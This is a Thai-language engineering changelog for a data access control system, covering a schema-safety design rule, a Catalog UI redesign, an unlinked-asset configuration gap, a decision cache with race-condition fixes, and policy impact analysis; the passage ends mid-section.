## รอบก่อนหน้า — เส้นแบ่งของ 5.1.1 · หน้า Catalog · และ **ช่องโหว่ที่เจอระหว่างตอบคำถาม**

> รอบนี้ไม่มีโค้ด backend ใหม่เลย — เป็นรอบของ **การตัดสินใจเชิงสถาปัตยกรรมหนึ่งข้อ** (ซึ่งผู้ใช้เป็นคนทัก), **งาน UI หนึ่งหน้า** และ **ช่องโหว่ของ config ที่ไม่มีใครเห็นเพราะระบบไม่ร้อง**

### AC.1 ผู้ใช้ทักว่า 5.1.1 เขียนทับ table เดิม — และทักถูก

คำถามคือ *"ยิง RLS/DDM/GRANT ลง object เดิม — อันนี้คือเขียนทับ table เดิมหรอ ถ้าใช่ ยังไม่ต้องทำดีกว่าไหม"* พร้อมขยายความว่า **"ถ้า Source สามารถ Config ได้ ก็ให้ยิง Config ไป เช่น bigquery"**

ของเดิมใน DESIGN เขียนรวมกันไว้ว่า "native config" ซึ่งซ่อนความจริงว่ามันเป็น**ของสองแบบที่ความเสี่ยงคนละเรื่อง**:

| กลุ่ม | ตัวอย่าง | เกิดอะไรกับ table |
|---|---|---|
| **policy object แยก** | PG `CREATE POLICY` · MSSQL `CREATE SECURITY POLICY` · BigQuery row access policy · Snowflake masking policy | table ไม่เปลี่ยนเลย — เราสร้าง object ใหม่แล้วผูกเข้าไป |
| **เขียนคำนิยามทับ** | **MSSQL DDM** — `ALTER TABLE ... ALTER COLUMN ... ADD MASKED WITH` | **เขียนทับนิยามของ column ที่ลูกค้าเป็นคนสร้าง** |

ตัวที่ผู้ใช้ไม่อยากได้คือกลุ่มล่าง และมีแค่ตัวเดียว → **ตัด DDM ออกจาก Phase 1** ไม่ใช่ตัดทั้ง M6

**บันทึกเป็นกติกาถาวรใน DESIGN ข้อ 8:** ARAK สร้าง/ลบได้เฉพาะ **object ที่ตัวเองเป็นเจ้าของ** (view, policy object, entitlement table) + GRANT/REVOKE เท่านั้น · **ห้าม `ALTER TABLE ... ALTER COLUMN`**

> **เหตุผลที่ชี้ขาดคือ rollback ไม่ใช่ความเสี่ยงตอน apply** — rollback ของ object ที่เราสร้างคือ `DROP` ซึ่งสะอาดเสมอไม่ว่า apply จะพังกลางทางตรงไหน ส่วน rollback ของ `ALTER COLUMN` คือการ**เดาว่าเราจำนิยามเดิมได้ถูก** ถ้าจำผิดคือแก้ schema ของลูกค้าผิดถาวร

**ที่แลกมา (ต้องบอกตรงๆ ไม่ใช่กลบ):** ทิ้ง DDM แล้วจะเสียคุณสมบัติ *"query ตารางชื่อเดิมได้โดยไม่ต้องแก้ report"* เฉพาะส่วน masking — ทางทดแทนคือ **rename swap ใน FR-6.1.1** (`customer` → `customer_raw`, ตั้งชื่อ view ว่า `customer`) ซึ่งให้ผลเท่ากันโดยไม่แตะนิยาม table เลย · และ DDM เองก็ทำ **cell mask ไม่ได้อยู่แล้ว** ของที่เสียไปจึงน้อยกว่าที่คิด

**M6 ถูก re-scope เป็น "push config"** ตามที่ผู้ใช้หมายถึง: ยิงเฉพาะ policy object · **BigQuery row access policy / policy tag กับ Snowflake masking policy คือเคสที่โมเดลนี้เกิดมาเพื่อมัน** (Phase 2) · M6 เลื่อนไปหลัง M5/M7 และเป็น **opt-in ต่อ source** ไม่ใช่ default

ไฟล์ที่แก้: `docs/DESIGN.md` — decision row 6 เขียนใหม่ · **decision row 8 ใหม่** (row secrets เลื่อนเป็น 9) · ตารางเทียบ FR-6 เปลี่ยนหัวข้อเป็น "5.1.1 Push config" และเปลี่ยนแถว "แตะ object เดิม" เป็น "เขียนคำนิยาม table ไหม" · **หัวข้อใหม่ FR-6.2a** ตารางแยกรายคำสั่งว่าอันไหนทำได้/ไม่ได้ · แถว M6 ในตาราง milestone · แถว M3 ที่ status ค้างเก่า

### AC.2 หน้า Catalog — list ที่ให้อ่าน FQN เพื่อเดาว่าของแต่ละแถวคืออะไร

ผู้ใช้บอกว่า *"List ใน Catalog มันจืดๆ ไม่ค่อยสวย"* สาเหตุจริงไม่ใช่เรื่องสี แต่คือ **service / database / schema / table / view ถูก render เหมือนกันหมด** — ผู้อ่านต้องไปไล่อ่าน FQN เองถึงจะรู้ว่าแถวไหนเป็นอะไร

| ของเดิม | ของใหม่ |
|---|---|
| card ลอยเรียงกันด้วย `space-y-3` | **list เดียว border รอบ + `divide-y`** — ได้พื้นที่แนวตั้งคืน ~1/3 |
| badge `type="modern"` สีเทาทุกชนิด | badge `type="color"` สีตามชนิด + **ไอคอนใน tile สีเดียวกัน** |
| กดได้เฉพาะชื่อ (~80px) | **ทั้งแถวเป็นลิงก์** (`absolute inset-0` + `pointer-events-none` บน content, คืน `auto` ให้ชิป) |

สีเรียงตามลำดับชั้นที่มันซ้อนกันจริง เพื่อให้ความลึกอ่านเป็น gradient ไม่ใช่ noise:
`SERVICE` gray-blue (Server01) → `DATABASE` blue (Database01) → `SCHEMA` indigo (Folder) → `TABLE` brand (Table) → `VIEW` purple (Eye) · ชนิดที่ไม่รู้จักตกไป `UNKNOWN_LOOK` สีเทา

> **กับดักที่เจอ (จดไว้เพราะจะเจออีก):** badge `type="modern"` **รับได้แค่ `color="gray"`** เพราะมันใช้ `addonOnlyColors` ไม่ใช่ `filledColors` · ถ้าส่งสีอื่นจะพังตอน `tsc` ไม่ใช่ตอน runtime (`TS2322: Type 'BadgeColors' is not assignable to type '"gray" | undefined'`) · ตัวที่รับทั้ง union คือ `type="color"` และ `type="pill-color"`

> **กับดักที่สอง — ทำ test พังโดยที่ UI ถูก:** ตอนแรกให้ลิงก์คลุมแถวมี accessible name ด้วย `<span className="sr-only">{name}</span>` ผลคือ**ชื่อแถวโผล่ใน DOM สองที่** → `findByText('customer')` เจอสองตัวแล้ว fail · แก้ด้วย `aria-label` บน `<Link />` แทน ซึ่งให้ชื่อกับ screen reader โดยไม่เพิ่ม text node · **บทเรียน: ถ้าจะให้ element ที่มองไม่เห็นมีชื่อ ใช้ attribute ไม่ใช่ข้อความซ้ำ**

ตรวจแล้ว: `tsc --noEmit` ผ่าน · `eslint` ผ่าน · `jest src/pages/catalog` **15/15 ผ่าน**

### AC.3 ⚠️ ช่องโหว่ที่เจอตอนตอบคำถามเรื่อง match — asset 36 จาก 40 ยัง enforce ไม่ได้

ผู้ใช้ถามว่า *"เอา metadata มาจาก openmetadata แล้ว และเราก็ต่อ Datasource ที่ ARAK ด้วย จะ match กันยังไง"*

**กลไกคือจุดเชื่อมจุดเดียว: `data_source.om_service_fqn`** — กรอกมือครั้งเดียวต่อ source ว่า connection นี้ชื่ออะไรในฝั่ง OM ที่เหลือ match เองทั้งหมด เพราะ FQN ของ OM เรียงตามลำดับชั้นอยู่แล้ว:

```
prod-pg    .  SalesDB  .  dbo    .  customer  .  email
└service─┘    └database┘  └schema┘  └ table ─┘   └column┘
    ▲
    └── segment 0 เท่านั้นที่ map มือ
```

`AssetStore.java:534-547` ตัด segment 0 แล้วยิง `SELECT id FROM data_source WHERE om_service_fqn = :fqn AND enabled` → ได้ `data_source_id` แปะให้ทุก asset ใต้ service นั้น · `asset_fqn_map` เก็บพิกัดจริงต่อ object (`database_name`/`schema_name`/`object_name`) + `verification_status` (`UNVERIFIED | MATCHED | ORPHANED | DRIFTED`) ไว้ให้ FR-1.6 เอา JDBC ไปยืนยันกับ source จริง (**ยังไม่ได้ทำ**)

**แต่พอไปเช็ค DB จริง เจอว่ายังไม่ได้เชื่อมเลย:**

```
name    | om_service_fqn | enabled      om_service | linked | count
--------+----------------+---------     -----------+--------+-------
demo-pg |     (NULL)     |    t         demo-pg    |   ใช่   |     4
                                        dtp-iprm   |  ไม่    |    36
```

- `demo-pg` มี `om_service_fqn` เป็น **NULL** → 4 แถวที่ linked มาจาก seed ตอน dev ไม่ได้มาจากการ match
- **36 จาก 40 asset** (31 TABLE · 2 VIEW · SERVICE/DATABASE/SCHEMA อย่างละ 1) มาจาก service `dtp-iprm` ของ OM จริง และ `data_source_id IS NULL` ทั้งหมด
- `asset_fqn_map` มี `MATCHED` อยู่แถวเดียว

> **ตัวปัญหาจริงคือ `.orElse(null)` ที่บรรทัดท้ายของ query นั้น** — match ไม่ได้แล้ว**ไม่ error** เก็บ asset ไว้เฉยๆ แบบ *"รู้จัก แต่ไม่รู้ว่าอยู่เครื่องไหน"* เขียน policy ได้ ติด tag ได้ แต่ **enforce ไม่ได้ query ไม่ได้** และ**หน้าจอไม่บอกอะไรเลย** — ผิดหลัก fail-loud ที่เราถือมาตลอด

**รอผู้ใช้ตอบ** ว่า `demo-pg` คือเครื่องเดียวกับ `dtp-iprm` หรือเปล่า (ถ้าใช่ set `om_service_fqn = 'dtp-iprm'` จบ · ถ้าไม่ใช่ต้องเพิ่ม source ใหม่ซึ่งต้องมี host/port/credential จริง) · และควรเพิ่ม **banner ในหน้า Catalog** ว่า asset เหล่านี้ยังไม่ผูก data source

### AC.4 IT สองตัวล้ม — environment ไม่ใช่โค้ด

`AssetStoreIT` (137.0 s) และ `CatalogQueryIT` (100.4 s) ล้มด้วย `ContainerLaunchException: Container startup failed for image postgres:16-alpine` → `Timed out waiting for log output matching '.*database system is ready to accept connections.*'`

Docker แน่นเพราะรัน backend + Vite + `dac-appdb` + `dac-srcpg` พร้อมกัน · **IT ตัวถัดไปในรอบเดียวกันผ่านหมด** (`GovernanceStoreIT` 10 · `IdentityAdminStoreIT` 15 · `ImpactAnalysisIT` 8) และ unit test **71/71 ผ่าน 0 failures 0 errors** → ยืนยันว่าเป็น resource ไม่ใช่ regression · **ยังต้องรันซ้ำสองตัวนี้ตอน Docker ว่าง**

---

## รอบก่อนหน้า — Decision cache (FR-5.5)

> รอบนี้แตะ backend อย่างเดียว (4 ไฟล์ใหม่ + 9 ไฟล์แก้ + 2 test ใหม่) · **ไม่มี migration** — cache อยู่ใน heap ล้วนๆ · มี config ใหม่ 3 ตัวใน `conf/dac.yml`

### AB. Cache ที่ไม่กล้าตอบคำถามที่ไม่ได้ถูกถาม (FR-5.5)

#### AB.1 ทำไมการ cache ผล decision ถึงอันตรายกว่าที่คิด

cache ทั่วไปตอบผิดแล้วหน้าจอกระตุก หรือตัวเลขผิด — **cache ตัวนี้ตอบผิดแล้วคนที่ไม่ควรเห็นข้อมูลเห็นข้อมูล** และจะไม่มี exception ไม่มี alert ไม่มีอะไรเลย

กับดักที่เห็นได้ชัดที่สุด: cache key ที่เป็น `(principal, asset)` เฉยๆ คือช่องโหว่เต็มๆ — policy ที่อนุญาต 08:00–18:00 พอ 18:00 มันหยุดอนุญาต **โดยที่ไม่มีการเขียนที่ไหนเลย** จึงไม่มีอะไรมา invalidate ให้

คำตอบคือ **entry หนึ่งตัวต้องตายได้ 3 ทาง อิสระจากกัน**:

| สิ่งที่ทำให้คำตอบเก่า | กลไก | ครอบอะไร |
|---|---|---|
| มีคนเขียน | `ChangeNotifier` → flush ทั้งก้อน + บวก generation | policy, binding, identity, catalog change, catalog crawl |
| เวลาเดิน | `DecisionValidity.until()` → ใส่ `validUntil` ต่อ entry | time window, `validFrom`/`validUntil`, `exemption.expiresAt` |
| อะไรก็ไม่รู้ | TTL 60s | write path ที่จะเพิ่มทีหลังแล้วลืม publish · instance ที่สองที่เราไม่ได้ยิน flush ของมัน |

> **สามชั้นนี้ไม่ได้ทำงานซ้ำกัน** — ชั้นแรกคือสิ่งที่ประกาศตัว ชั้นสองคือสิ่งที่ไม่มีใครประกาศ (นาฬิกา) ชั้นที่สามคือสิ่งที่เราคิดไม่ถึง

#### AB.2 ทำไม store เป็นคนประกาศ ไม่ใช่ REST resource

`ChangeNotifier` (ใหม่ ใน `dac-common`) — listener list ธรรมดา ยิง `fire(reason)` **หลัง commit บน thread เดิม**

ถ้าไปต่อ invalidation ไว้ที่ resource มันจะพัง**ครั้งแรกที่ write มาทางอื่น** — webhook จาก OM, poller, nightly reconcile ไม่ได้ผ่าน REST layer เลย และมันจะ**ไม่ error** มันจะแค่เสิร์ฟ decision เก่าต่อไปเงียบๆ

publisher ทั้งหมด 5 ตัว สมัครไว้ที่เดียวใน `DacApplication` เพื่อให้การลืม publisher ตัวที่ 6 เห็นได้จากที่เดียว:

| publisher | ยิงเมื่อ | ทำไม |
|---|---|---|
| `PolicyStore` | create / update / transition | ACTIVE↔DISABLED คือนาทีที่ enforcement เริ่มและหยุด |
| `PolicyBindingMaterializer` | เมื่อ binding **เปลี่ยนจริง** (`result.changed()`) | nightly reconcile re-resolve ทุก policy แต่เกือบไม่มีอะไรเปลี่ยน — ยิงทุกครั้งคือล้าง cache วันละหลายร้อยรอบฟรีๆ |
| `IdentityAdminStore` | สร้าง account / enable / disable / grant / revoke role | ชื่อที่เมื่อกี้ยัง resolve ไม่ได้ ตอนนี้ resolve ได้ → denial ที่ cache ไว้ต้องหาย · `resetPassword` **ไม่** ยิง (เปลี่ยน decision ไม่ได้) |
| `CatalogChangeApplier` | webhook/poller ที่ไม่ quiet | **tag ที่ลง column คือ policy change ที่ไม่มีใครในระบบนี้เป็นคนเขียน** — ชนิดที่ cache พลาดง่ายที่สุด |
| `CatalogSyncService` | crawl จบ | crawl เขียน facet ทั้ง estate |

ที่**จงใจไม่ใส่**: source registry กับ query executor — สองตัวนี้เปลี่ยนว่า "อ่านข้อมูลจากที่ไหน" ไม่ได้เปลี่ยนว่า "ใครเห็นอะไร"

#### AB.3 การเขียน test เจอรูโหว่ในโค้ดที่เพิ่งเขียนไปเอง — flush ที่ดูเหมือนทำงานแต่ไม่ได้ทำ

ฉบับแรก `put()` อ่าน `generation` **ตอนเก็บ** ซึ่งผิด:

```
thread A  17:59:59  อ่าน policy stack (generation = 7)
thread B  18:00:00  disable policy → flush, generation = 8
thread A  18:00:01  put() → อ่าน generation ได้ 8 → เก็บสำเร็จ
            → คำตอบที่คำนวณจาก policy ที่ถูกปิดไปแล้ว ถูกเสิร์ฟต่ออีก 1 นาที
```

แก้ด้วยให้ `DecisionService` อ่าน `cache.generation()` **ก่อนแตะ DB** แล้วส่งค่านั้นเข้า `put(..., readAt)` — `put` เช็คสองรอบ (ก่อน serialize และอีกทีใน lock) ถ้าไม่ตรงคือทิ้งและนับเข้า `lapped`

#### AB.4 test เองเจอบั๊กอีกตัว — mapper ที่เขียน `Instant` ไม่ได้

รอบแรกที่รัน `DecisionCacheTest` **แดง 7/14** ด้วยอาการเดียว: ไม่มีอะไรถูกเก็บเลย สาเหตุคือ test ใช้ `new ObjectMapper()` เปล่าๆ ซึ่งเขียน `Instant` ไม่ได้ (ไม่มี JSR-310 module) → `put()` throw → โดน catch → **เงียบ**

แต่สิ่งที่ test ชี้คือโหมดพังที่อันตรายจริงๆ:

> **cache ที่ไม่เก็บอะไรเลย คือ cache ที่ไม่เคยตอบผิด** — ทุก endpoint ยังตอบถูก ทุก test ยังเขียว ไม่มีอะไรบอกว่า NFR-2 ไม่ถูกทำตาม นอกจาก log WARN บรรทัดเดียว

แก้สองทาง:
1. **test** ใช้ `Jackson.newObjectMapper()` ตัวเดียวกับที่ Dropwizard สร้าง — mapper คือส่วนหนึ่งของสิ่งที่ถูกทดสอบ
2. **production** เพิ่ม counter `unstorable` ใน `Stats` + log stack trace แค่ครั้งแรก → ดูที่ `/v1/system/decision-cache` แล้วเห็นทันที ไม่ต้องไปงม log
3. เพิ่ม test ที่ยืนยันว่าโหมดนี้**นับได้** ไม่ใช่แค่ log

อีกตัวหนึ่งที่ test เจอ: `expiresAtIsHonoured` ตั้ง `expiresAt` ไว้ที่ +600s ขณะที่ TTL แค่ 60s → TTL ฆ่า entry ก่อน — **test ผิด ไม่ใช่โค้ดผิด** แก้ด้วยให้ test นั้นใช้ TTL 1 ชม. เพื่อให้ขอบที่ทดสอบคือขอบที่ policy ให้มาจริงๆ

#### AB.5 ที่เก็บเป็น JSON bytes ไม่ใช่ object

POJO ที่ generate มามี `withX(...)` ที่ **mutate in place แล้ว return this** — ถ้าเก็บ object ตรงๆ caller คนแรกที่ติด `fromCache` จะติดค้างไว้ใน cache ถาวร และอะไรก็ตามที่มันแก้ต่อจะติดตามไปด้วย · serialize/deserialize จ่ายหลักสิบไมโครวินาทีเทียบกับงบ 10ms ถือว่าคุ้ม

#### AB.6 วัดจริง ไม่ได้อ้างเอกสารออกแบบ

backend ที่รันอยู่จริง → login admin → `POST /v1/decisions` 1 cold + 6 warm บน `analyst_a` / `dtp-iprm.iprm.public.customers`:

| | ค่า |
|---|---|
| cold (รวม JWT verify + Jetty) | **0.116s** |
| warm | **0.017 / 0.0155 / 0.0249 / 0.0181s** |
| `GET /v1/system/decision-cache` | `hits=6, misses=1, entries=1, bytes=449, evictions=0, invalidations=0` |

`fromCache=true` ขึ้นจริงใน response · **ผ่านงบ NFR-2 (<10ms cached / <100ms cold) โดยที่ตัวเลขข้างบนนับรวม HTTP overhead ทั้งหมดแล้ว**

#### AB.7 ของที่เพิ่มรอบนี้

**ไฟล์ใหม่**
- `dac-common/.../ChangeNotifier.java`
- `dac-engine/.../DecisionValidity.java` + `DecisionValidityTest.java` (10 tests)
- `dac-service/.../policy/DecisionCache.java` + `DecisionCacheTest.java` (15 tests)
- `dac-service/.../config/DecisionCacheConfiguration.java`

**แก้**
- `DecisionService` — `Ask.at` ไม่ default เป็น `Instant.now()` อีกต่อไป · `when()` / `live()` · **null ≠ now** (null = "ตอนไหร่ก็ตามที่รัน" และ**เฉพาะอันนั้นที่ cache ได้** — simulation ที่ pin เวลาถามคนละคำถาม)
- `QueryService` — ส่ง `null` เป็น `at` เพื่อให้ path ที่ร้อนที่สุด cache ได้
- `PolicyStore` / `PolicyBindingMaterializer` / `IdentityAdminStore` / `CatalogChangeApplier` / `CatalogSyncService` — เพิ่ม `changes()`
- `DacApplication` — สร้าง cache ก่อน store ทุกตัว + subscribe 5 publisher
- `SystemResource` — `GET /v1/system/decision-cache` (**หลัง auth filter** ต่างจาก `/version` เพราะ `lastInvalidationReason` มีชื่อ policy หรือชื่อคน)
- `DacConfiguration` + `conf/dac.yml` — block `decisionCache`

**env ใหม่ 3 ตัว** (มี default หมด ไม่ต้องตั้ง)
| | default | เมื่อไหร่ถึงแตะ |
|---|---|---|
| `DECISION_CACHE_ENABLED` | `true` | **สิ่งแรกที่ควรลองเมื่อ decision ดูเก่าแล้วหาสาเหตุไม่เจอ** — ปิดแล้ว restart จ่าย 3 DB read ต่อ decision |
| `DECISION_CACHE_MAX_ENTRIES` | `50000` | heap ไม่พอ (entry ละ ~450 bytes → 50k ≈ 22MB) |
| `DECISION_CACHE_TTL_SECONDS` | `60` | เพดานของ "นานแค่ไหนที่คำตอบผิดอยู่ได้ถ้าไม่มีใครประกาศ" · **ถ้า deploy หลาย instance ต้องลดตัวนี้** เพราะ generation counter เป็น single-process |

#### AB.8 ข้อจำกัดที่ต้องรู้

- **generation counter เป็น single-process** — สอง instance จะไม่ได้ยิน flush ของกันและกัน สิ่งเดียวที่คุ้มกันคือ TTL → **ก่อน scale out ต้องย้าย invalidation ไปอยู่บน pub/sub หรือลด TTL เหลือหน่วยวินาที**
- flush เป็นแบบ**ทั้งก้อน** ไม่ได้เลือกลบเฉพาะ key ที่กระทบ — จงใจ เพราะ map จาก "policy นี้เปลี่ยน" → "คนเหล่านี้บน table เหล่านี้ผิดแล้ว" ต้องเดินผ่าน selector + group closure + facet inheritance และ**เวอร์ชันที่ไม่ครบของมันไม่ throw — มันแค่ปล่อยให้บางคนเข้าได้ต่อไปเงียบๆ**
- `DecisionValidity` จงใจ**ทำซ้ำ minute granularity ของ `PolicyEngine.cacheKey()`** แทนที่จะคำนวณขอบ window เอง — สองที่คิดเรื่องเวลาต่างกันคือสองที่จะค่อยๆ ไม่ตรงกัน · มี test `matchesEngineGranularity` คอยจับถ้าสองตัวเริ่มไม่ตรงกัน
- `DecisionValidity` ดู **policy ทั้ง stack ไม่ใช่เฉพาะตัวที่ match** — policy ที่จะเริ่มมีผลเที่ยงคืนต้องจบ entry นี้ด้วย ถึงแม้วันนี้มันไม่ได้พูดอะไรเลย

---

## รอบก่อนหน้า — Impact analysis (FR-5.3) · **ปิด M4**

> ข้อสุดท้ายของ M4 · รอบนี้แตะ backend (3 ไฟล์แก้ + 1 ไฟล์ใหม่ + 1 IT ใหม่) และ frontend (2 ไฟล์) · **ไม่มี migration** — คำถามนี้ตอบได้ด้วยของที่มีอยู่แล้วทั้งหมด

### AA. "ถ้าเปิด policy นี้ ใครกระทบบ้าง" (FR-5.3)

#### AA.1 คำถามที่ดูง่ายแต่ตอบผิดได้ง่ายกว่า

สิ่งที่คนคาดว่าจะเห็นตรงนี้คือ **จำนวน binding** — "policy นี้ผูกกับ 40 table, 12 column" ซึ่ง `PolicyOverview.coverage()` ตอบอยู่แล้วและ **เป็นคำตอบที่ผิด**:

> policy ที่ผูกกับ 40 table อาจ **ไม่เปลี่ยนอะไรให้ใครเลยแม้แต่คนเดียว** ถ้าทุกอย่างที่มันห้าม ถูกห้ามอยู่แล้วโดยชั้นที่อยู่เหนือมัน
> ในทางกลับกัน policy ที่ผูกกับ **table เดียว** อาจตัดคนทั้งบริษัทออกจากข้อมูลนั้น

เพราะ composition เป็น intersection (FR-5.1) "เพิ่ม policy หนึ่งตัว" จึงไม่ได้แปลว่า "เพิ่มข้อจำกัดหนึ่งข้อ" · คำตอบที่ถูกคือ **counterfactual**: สำหรับทุกคู่ (คน, table) ให้ engine ตัดสินสองครั้ง — **มี** policy นี้ในกอง กับ **ไม่มี** — แล้วรายงานเฉพาะส่วนที่ต่าง

#### AA.2 สองโลกที่ต่างกันแค่ policy เดียว — บังคับด้วย SQL ไม่ใช่ด้วยวินัย

`PolicyStore.activeForIncluding(assetFqn, environment, candidate)` (ใหม่) — query เดียวกับ `activeFor()` ทุกประการ **บวกเงื่อนไข `p.id = :candidate` เข้าไปใน `WHERE`** เพื่อให้ draft ที่ยังไม่ ACTIVE ถูกดันเข้ากองด้วย

ทำไมต้องยัดใน SQL แทนที่จะ `list.add(draft)` ใน Java: ลำดับชั้น `ORG → DOMAIN → … → COLUMN` อยู่ใน `ORDER BY CASE p.scope_level …` ของ query นั้น · ถ้าแทรกจากฝั่ง Java ต้อง**เขียนลำดับนั้นซ้ำอีกที่หนึ่ง** แล้วสองที่จะค่อยๆ ไม่ตรงกัน

แล้วโลกที่ "ไม่มี" ได้มาจาก **กรองลิสต์เดิมในหน่วยความจำ** ไม่ใช่ query ใหม่:

```java
List<Policy> withDocs    = documents(with, null);   // ทั้งกอง
List<Policy> withoutDocs = documents(with, id);     // กองเดิม ลบตัวเดียว
```

> query สองครั้งจะต่างกันได้**มากกว่าหนึ่ง policy** — policy อื่นหมดอายุระหว่างสองคำสั่งก็เป็นไปได้ · แล้ว impact report จะไปโทษ policy นี้ว่าเป็นต้นเหตุของการหมดอายุของคนอื่น ซึ่งแย่กว่าไม่มี report

#### AA.3 `PrincipalLoader.everyone()` — และทำไม group ไม่ถูกนับ

`find()` เดิมโหลดทีละคนด้วย 4 query · วน 200 คนจะได้ 800 query → เพิ่ม `everyone(handle, limit)` ที่ยิง **4 query รวม** (principal, app role, membership, attribute) แล้วประกอบเป็น `Principal` **รูปร่างเดียวกันเป๊ะ** กับ `find()` — สำคัญเพราะถ้าสองทางประกอบไม่เหมือนกัน หน้า impact กับหน้า simulator จะบรรยายคนคนเดียวกันคนละแบบ

membership ใช้ recursive CTE **สองคอลัมน์** ที่แบก seed member id ไปด้วย เพื่อให้ปิด transitive closure ของทุกคนได้ในคำสั่งเดียว:

```sql
WITH RECURSIVE reachable(member_id, group_id) AS (
    SELECT member_id, group_id FROM group_member WHERE member_id IN (<ids>)
  UNION
    SELECT r.member_id, m.group_id FROM group_member m
    JOIN reachable r ON m.member_id = r.group_id)
```

**group ไม่ถูกนับเป็น "คน"** — `principal_type IN ('USER','SERVICE')` เท่านั้น · group เป็นแถวใน `principal` เพื่อให้ membership ซ้อนกันได้ แต่ **ไม่มีใคร login เป็น group** และการนับ group รวมไปด้วยจะทำให้ทุกตัวเลขบนหน้าจอพองขึ้นโดยไม่มีความหมาย (มีเทสต์กันไว้: `principalsKnown == 3` ทั้งที่มี 4 แถวใน `principal`)

#### AA.4 6 ผลลัพธ์ เรียงตามความร้ายแรง — และ ordinal คือลำดับนั้นจริงๆ

```java
public enum Change { LOSES_ACCESS, GAINS_ACCESS, CHANGED, SEES_LESS, SEES_MORE, UNCHANGED }
```

`compare(fqn, before, after)` เทียบ **verdict ก่อน** (allow/deny พลิก = เรื่องใหญ่สุด) · ถ้า deny ทั้งสองข้าง = `UNCHANGED` (สิ่งที่ *จะ* ถูก mask ถ้าเข้าถึงได้ ไม่ใช่ความต่างที่ใครสังเกตได้) · ไม่งั้นค่อย diff สามชุด: `hidden()` / `masks()` / `rows()`

**mask เทียบด้วย `column:function:condition` ไม่ใช่ object identity** — column เดียวกันถูก mask ด้วย function เดียวกันแต่มาจาก policy คนละตัว **ไม่ใช่ความเปลี่ยนแปลงที่ใครมองเห็นในข้อมูล** และถ้ารายงานมันจะกลบความเปลี่ยนแปลงจริงที่อยู่ในรายการเดียวกัน

การ sort ใช้ `ordinal()` ตรงๆ ทั้งระดับ table และระดับคน (`worst = tables.get(0).change()`) · เคยเขียน `worseThan()` ไว้แล้วลบทิ้ง เพราะไม่มีใครเรียก — โค้ดตายที่อ่านเหมือนเป็นกฎ

#### AA.5 ประกาศว่าสุ่ม ไม่ใช่ซ่อนว่าสุ่ม

cap: **25 table × 200 principal × 2 evaluations** · แต่ `Impact` แบก `tablesBound` vs `tablesMeasured`, `principalsKnown` vs `principalsMeasured`, และ `sampled` ออกไปด้วยทุกครั้ง

- table ที่ผูกอยู่แต่ **ไม่มีใน cache** จะ `continue` โดย**ไม่เพิ่ม** `measured` — เวอร์ชันแรกรายงาน `fqns.size()` ซึ่งแปลว่า run ที่วัดได้ครึ่งเดียวจะขึ้นจอว่าวัดครบ
- ฝั่ง UI `sampled === true` เปลี่ยนคำเป็น **"at least"** ทุกที่ + ต่อท้ายว่า *"capped for speed, so these are floors rather than totals"*
- บรรทัดขอบเขต (`1 of 1 table · 3 of 3 people`) **ขึ้นเสมอ ไม่ใช่เฉพาะตอนไม่ครบ** — ตัวเลขที่ซ่อนตัวหารคือสิ่งที่ panel นี้มีไว้เพื่อไม่ให้เกิด

#### AA.6 draft กับ active ใช้เลขชุดเดียวกัน ต่างแค่กาล

`candidateActive` บอก UI ว่าจะเล่าด้วยกาลไหน — เลขไม่ต่างกันเลย เพราะ policy ที่ ACTIVE อยู่แล้วก็ถูกวัดเทียบกับ "โลกที่ไม่มีมัน" เหมือนกัน:

| | ประโยคบนจอ |
|---|---|
| DRAFT | *"Activating this would change what 2 people see on 1 table."* |
| ACTIVE | *"This policy is the reason 2 people see what they see on 1 table."* |
| กระทบ 0 คน | *"Activating this would change nothing for anyone. Everything it restricts is already restricted by the policies around it."* |

ป้ายทุกใบ (`loses the table` / `sees less` / …) เขียนจาก**มุมที่ policy เปิดอยู่** เสมอ เพราะเลขเดินทางเดียว — ประโยคข้างบนเท่านั้นที่เปลี่ยน

#### AA.7 ไฟล์

| ไฟล์ | |
|---|---|
| `policy/ImpactAnalysis.java` | **ใหม่ ~420 บรรทัด** — `measure(StoredPolicy)` · `TABLE_LIMIT=25` `PRINCIPAL_LIMIT=200` `DETAIL_LIMIT=50` · record `Impact` / `PrincipalChange` / `TableChange` |
| `policy/PolicyStore.java` | `+activeForIncluding(fqn, env, candidate)` |
| `policy/PrincipalLoader.java` | `+everyone()` `+countEveryone()` `+allMemberships()` (batched) |
| `resources/PolicyResource.java` | `GET /{id}/impact` · ctor รับ `ImpactAnalysis` เป็นตัวที่ 4 |
| `DacApplication.java` | ย้าย `PolicyEngine` ขึ้นมาก่อน `PolicyResource` + แชร์ `PrincipalLoader` ตัวเดียวกับ `DecisionService` (authoring ต้องใช้ engine ตัวเดียวกับ enforcement ไม่งั้น preview โกหกได้) |
| `test/.../ImpactAnalysisIT.java` | **ใหม่ 8 tests** บน Postgres จริง |
| `frontend/app/src/api/policies.ts` | `+PolicyImpact` / `PolicyImpactPrincipal` / `PolicyImpactTable` / `PolicyImpactChange` + `fetchPolicyImpact()` |
| `frontend/app/src/pages/policies/PolicyDetailPage.tsx` | panel `<Impact>` ระหว่าง Coverage กับ Conflicts · `refetchOnWindowFocus: false` (สองการ evaluate ต่อคนต่อ table — invalidate ตอน re-resolve / เปลี่ยน lifecycle แทน) |

#### AA.8 เทสต์

`ImpactAnalysisIT` **8 ตัว** — `baseline()` สร้างและ **activate** ORG SUBSCRIPTION ALLOW ก่อนทุกเคส เพราะถ้าไม่มี ทุก decision จะ deny ทั้งสองข้างและ**ทุกเทสต์จะผ่านแบบว่างเปล่า** (จดไว้ใน javadoc ของมันแล้ว)

- `Population` — group ไม่ถูกนับเป็นคน · estate เล็กวัดครบและบอกว่าครบ (`sampled == false`)
- `Changes` — draft ที่ deny ดึงสิทธิ์จากทุกคนที่เคยมี · **draft ที่ grant สิ่งที่ถูก grant อยู่แล้ว กระทบ 0 คน** (ข้อกลางของทั้งหมด) · denial ที่ผูกกับ attribute ระบุชื่อเฉพาะคนที่ตก · draft ที่ mask บอกชื่อ column ที่มันแคบลง · policy ที่ ACTIVE อยู่แล้ววัดเทียบโลกที่ไม่มีมัน · policy ที่ไม่ผูกกับอะไรเลยคือ report ว่าง ไม่ใช่ error

`PolicyDetailPage.test.tsx` **+5 ตัว** (11 → 16) — กระทบ 0 คนต้องพูดออกมาแม้ผูก 40 table · คนที่เสียสิทธิ์ต้องถูกระบุชื่อพร้อม table · ACTIVE ต้องเล่าด้วยกาลปัจจุบัน · run ที่สุ่มต้องขึ้น "at least" · ผูก 0 table ต้องบอกให้ไป re-resolve ไม่ใช่โชว์เลข 0

#### AA.9 ยิงจริงกับ backend ที่รันอยู่

```
